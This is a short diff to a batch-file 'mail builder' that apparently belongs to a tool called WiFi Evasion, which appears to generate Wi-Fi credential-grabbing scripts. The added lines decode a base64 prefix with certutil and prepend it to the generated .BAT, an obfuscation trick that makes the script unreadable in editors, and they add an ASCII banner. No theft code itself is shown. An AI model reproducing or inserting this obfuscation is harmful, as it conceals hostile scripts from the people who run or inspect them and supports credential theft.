@@ -130,6 +130,22 @@ COLOR 0B
         ECHO SET /A L^=^^!L^^! + 10
         ECHO EXIT /B
     )>WiFi-Evasion-[MAIL.-VERSION].BAT
+SET O="WiFi-Evasion-[MAIL.-VERSION].BAT"
+SET N="WiFi-Evasion-[MAIL.-VERSION]-TEMP.BAT"
+COPY %O% %N%
+>"TEMP.~B64" ECHO(//4mY2xzDQo=
+CERTUTIL.EXE -F -DECODE "TEMP.~B64" "%N%"
+COPY "%N%" /B + "%O%" /B
+DEL "TEMP.~B64"
+DEL %O%
+RENAME %N% %O%
+CLS
+ECHO  _ _ _ _____ _____ _____    _____ _____ _____ _____ _____ _____ _____ 
+ECHO ^| ^| ^| ^|     ^|   __^|     ^|  ^|   __^|  ^|  ^|  _  ^|   __^|     ^|     ^|   ^| ^|
+ECHO ^| ^| ^| ^|-   -^|   __^|-   -^|  ^|   __^|  ^|  ^|     ^|__   ^|-   -^|  ^|  ^| ^| ^| ^|
+ECHO ^|_____^|_____^|__^|  ^|_____^|  ^|_____^|\___/^|__^|__^|_____^|_____^|_____^|_^|___^|
+ECHO WiFi Evasion By LESiO - https://github.com/FreeLesio/WiFi-Evasion     
+ECHO ----------------------------------------------------------------------
 ECHO.
 TITLE WiFi Evasion [MAIL BUILDER] - LESiO [OK]
 COLOR 0A
